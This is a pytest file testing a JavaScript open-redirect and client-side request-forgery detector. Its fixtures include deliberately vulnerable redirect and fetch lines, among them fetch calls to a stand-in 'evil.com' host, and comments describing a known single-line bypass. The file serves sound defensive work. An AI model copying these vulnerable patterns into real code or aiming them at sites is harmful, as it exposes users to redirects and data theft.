from __future__ import annotations

from agentsec.guards.js_client_side_open_redirect import JsClientSideOpenRedirectGuard
from tests.guards._common import *  # noqa: F401,F403


def test_flags_location_href_from_url_search_params(tmp_path: Path) -> None:
    (tmp_path / "redirect.js").write_text(
        'window.location.href = new URLSearchParams(location.search).get("next");\n',
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    findings = JsClientSideOpenRedirectGuard().run(tmp_path, profile)
    assert len(findings) == 1
    assert findings[0].rule == "js-client-side-open-redirect/tainted-location-redirect"


def test_flags_location_replace_from_document_url(tmp_path: Path) -> None:
    (tmp_path / "redirect.ts").write_text(
        "location.replace(document.URL.split('next=')[1]);\n", encoding="utf-8"
    )
    profile = mkprofile(tmp_path, features={"typescript"})
    assert len(JsClientSideOpenRedirectGuard().run(tmp_path, profile)) == 1


def test_flags_location_assign(tmp_path: Path) -> None:
    (tmp_path / "redirect.js").write_text(
        "location.assign(location.search.slice(1));\n", encoding="utf-8"
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert len(JsClientSideOpenRedirectGuard().run(tmp_path, profile)) == 1


def test_flags_window_open_with_location_search(tmp_path: Path) -> None:
    # Review #395 Major finding: window.open()/window.navigate() are documented sinks but were
    # never actually implemented.
    (tmp_path / "redirect.js").write_text(
        "window.open(location.search);\n", encoding="utf-8"
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    findings = JsClientSideOpenRedirectGuard().run(tmp_path, profile)
    assert len(findings) == 1


def test_silent_on_triple_equals_comparison(tmp_path: Path) -> None:
    # FP-bait (review #395 Major finding): the sink regex's `=` matched the `=` inside `===`.
    (tmp_path / "redirect.js").write_text(
        "if (location.href === document.URL) { report(); }\n", encoding="utf-8"
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_silent_on_trailing_comment_mentioning_pattern(tmp_path: Path) -> None:
    # FP-bait (review #395 Minor finding): a trailing `//` comment after real code on the same
    # line was not stripped by the old whole-line-only comment check.
    (tmp_path / "redirect.js").write_text(
        'window.location.href = "/dashboard"; // was: location.search redirect\n',
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_silent_on_static_redirect(tmp_path: Path) -> None:
    (tmp_path / "redirect.js").write_text(
        'window.location.href = "/dashboard";\n', encoding="utf-8"
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_silent_when_source_and_sink_on_separate_lines(tmp_path: Path) -> None:
    # Deliberately conservative (single-line only) — documented as a known bypass,
    # not a bug, to avoid the dataflow-through-a-variable-name risk.
    (tmp_path / "redirect.js").write_text(
        "const params = new URLSearchParams(location.search);\n"
        "window.location.href = params.get('next');\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_silent_on_comment_mentioning_pattern(tmp_path: Path) -> None:
    (tmp_path / "redirect.js").write_text(
        "// Never do: window.location.href = location.search\n"
        'window.location.href = "/dashboard";\n',
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_pragma_suppresses(tmp_path: Path) -> None:
    (tmp_path / "redirect.js").write_text(
        "// security: allow-js-client-side-open-redirect\n"
        'window.location.href = new URLSearchParams(location.search).get("next");\n',
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_silent_on_fetch_same_origin_relative_path_plus_query_string(tmp_path: Path) -> None:
    # #548 review Medium 6: the request-forgery sink used to fire on ANY sink/taint
    # pairing within a 200-char window, with no regard for whether the taint actually controls
    # the request's destination. `fetch('/api/data?redirect=' + ...)` targets a FIXED,
    # same-origin relative path — the tainted value can only ever land in the query string
    # appended after it, never the host/origin, so this was never client-side request forgery.
    # (This fixture is the guard's OWN former "positive" test — it was asserting the FP as a
    # true positive; see `test_flags_fetch_full_url_from_search_param` below for the genuinely
    # dangerous companion case this guard must still catch.)
    (tmp_path / "redirect.js").write_text(
        "fetch('/api/data?redirect=' + new URLSearchParams(location.search).get('url'));\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_silent_on_fetch_same_origin_relative_path_plus_location_search(tmp_path: Path) -> None:
    # Exact FP shape from the #548 review: fetch('/api/search' + location.search).
    (tmp_path / "redirect.js").write_text(
        "fetch('/api/search' + location.search);\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_flags_protocol_relative_url_disguised_as_same_origin(tmp_path: Path) -> None:
    # #548 round-3 review, High 3: a single leading `/` is same-origin-safe, but TWO
    # (`//evil.com/x`) is a protocol-relative URL targeting a DIFFERENT host — the same-origin
    # exclusion above used to match this too, silently missing a genuinely cross-origin sink.
    (tmp_path / "redirect.js").write_text(
        "fetch('//evil.com/x' + location.search);\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    findings = JsClientSideOpenRedirectGuard().run(tmp_path, profile)
    assert len(findings) == 1


def test_flags_backslash_protocol_relative_url_disguised_as_same_origin(tmp_path: Path) -> None:
    # #548 round-4 gate: the `(?!/)` lookahead above closed `//host` but not `/\host`. WHATWG
    # treats `\` as `/` for special schemes, so the browser normalizes `/\evil.com` to
    # `//evil.com` and navigates cross-origin — the same vulnerability class in a second
    # spelling. Measured 0 findings before the lookahead was widened to `(?![/\\])`.
    (tmp_path / "redirect.js").write_text(
        "fetch('/\\\\evil.com' + location.search);\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    findings = JsClientSideOpenRedirectGuard().run(tmp_path, profile)
    assert len(findings) == 1


def test_silent_on_relative_path_containing_a_later_slash_or_backslash(tmp_path: Path) -> None:
    # FP-bait for the widening directly above (CLAUDE.md rule 1). Only the byte IMMEDIATELY after
    # the leading `/` decides same-origin, so an ordinary relative path that happens to contain a
    # doubled slash or a backslash further along must still stay silent. Without this, the obvious
    # over-broad fix ("reject any `/` or `\` anywhere in the literal") would read as correct.
    (tmp_path / "redirect.js").write_text(
        "fetch('/api//v2' + location.search);\n"
        "fetch('/api\\\\v2' + location.search);\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_flags_fetch_full_url_from_search_param(tmp_path: Path) -> None:
    # True-positive companion to the FP-bait above (request-forgery sink family): here
    # the ENTIRE fetch() argument is the tainted value with no leading same-origin literal, so
    # the attacker fully controls the request destination (host/origin included) — a genuine
    # client-side request forgery / cross-origin data-exfiltration case that must still fire.
    (tmp_path / "redirect.js").write_text(
        "fetch(new URLSearchParams(location.search).get('url'));\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    findings = JsClientSideOpenRedirectGuard().run(tmp_path, profile)
    assert len(findings) == 1
    assert findings[0].rule == "js-client-side-open-redirect/request-forgery"


def test_flags_axios_get_from_location_search(tmp_path: Path) -> None:
    (tmp_path / "redirect.js").write_text(
        "axios.get(location.search);\n", encoding="utf-8"
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    findings = JsClientSideOpenRedirectGuard().run(tmp_path, profile)
    assert len(findings) == 1
    assert findings[0].rule == "js-client-side-open-redirect/request-forgery"


def test_flags_xhr_open_from_location_search(tmp_path: Path) -> None:
    # Scoped precision decision: the first `.open()` argument must literally be a quoted
    # HTTP-verb string (the XMLHttpRequest.prototype.open(method, url) call shape).
    (tmp_path / "redirect.js").write_text(
        "xhr.open('GET', location.search);\n", encoding="utf-8"
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    findings = JsClientSideOpenRedirectGuard().run(tmp_path, profile)
    assert len(findings) == 1
    assert findings[0].rule == "js-client-side-open-redirect/request-forgery"


def test_bypass_taint_through_callback_still_fires(tmp_path: Path) -> None:
    # Adversarial self-test: the tainted value is assigned to a variable, then passed into a
    # setTimeout callback before reaching fetch() — but it's still all on ONE physical line, so
    # the existing single-line, bidirectional (order-independent) window still catches it.
    (tmp_path / "redirect.js").write_text(
        "const url = location.search; setTimeout(() => fetch(url), 100);\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    findings = JsClientSideOpenRedirectGuard().run(tmp_path, profile)
    assert len(findings) == 1
    assert findings[0].rule == "js-client-side-open-redirect/request-forgery"


def test_silent_on_static_fetch_url(tmp_path: Path) -> None:
    # FP-bait: a hardcoded fetch URL, no tainted source anywhere near it — silent.
    (tmp_path / "redirect.js").write_text(
        "fetch('/api/data');\n", encoding="utf-8"
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_static_fetch_and_tainted_navigation_do_not_cross_contaminate(tmp_path: Path) -> None:
    # Adversarial self-test: a static-URL fetch() call in the SAME file as a genuinely tainted
    # navigation sink elsewhere — confirms the static fetch stays silent (no bleed-through from
    # the unrelated tainted line) and the one finding that does fire is the navigation one.
    (tmp_path / "redirect.js").write_text(
        "axios.get('/api/config');\n"
        "window.location.href = location.search;\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    findings = JsClientSideOpenRedirectGuard().run(tmp_path, profile)
    assert len(findings) == 1
    assert findings[0].rule == "js-client-side-open-redirect/tainted-location-redirect"


def test_silent_on_bare_axios_call(tmp_path: Path) -> None:
    # FP-bait: bare `axios(...)` (config-object call) is deliberately NOT a matched sink —
    # documented precision decision (mirrors js_ssrf.py's verb-methods-only sink).
    (tmp_path / "redirect.js").write_text(
        "axios({ url: location.search });\n", encoding="utf-8"
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_silent_on_generic_dot_open_call(tmp_path: Path) -> None:
    # FP-bait: a generic `.open(` call unrelated to XHR (e.g. a modal/db handle) whose first
    # argument is not a quoted HTTP verb — the scoped XHR precision decision keeps this silent.
    (tmp_path / "redirect.js").write_text(
        "modal.open(location.search);\n", encoding="utf-8"
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_pragma_suppresses_request_forgery_sink(tmp_path: Path) -> None:
    (tmp_path / "redirect.js").write_text(
        "// security: allow-js-client-side-open-redirect\n"
        "fetch(location.search);\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []


def test_not_applies_without_js_or_ts(tmp_path: Path) -> None:
    profile = mkprofile(tmp_path, features=set())
    assert not JsClientSideOpenRedirectGuard().applies(profile)


def test_nonproduct_path_skipped(tmp_path: Path) -> None:
    d = tmp_path / "examples"
    d.mkdir(parents=True)
    (d / "demo.js").write_text(
        'window.location.href = new URLSearchParams(location.search).get("next");\n',
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert JsClientSideOpenRedirectGuard().run(tmp_path, profile) == []
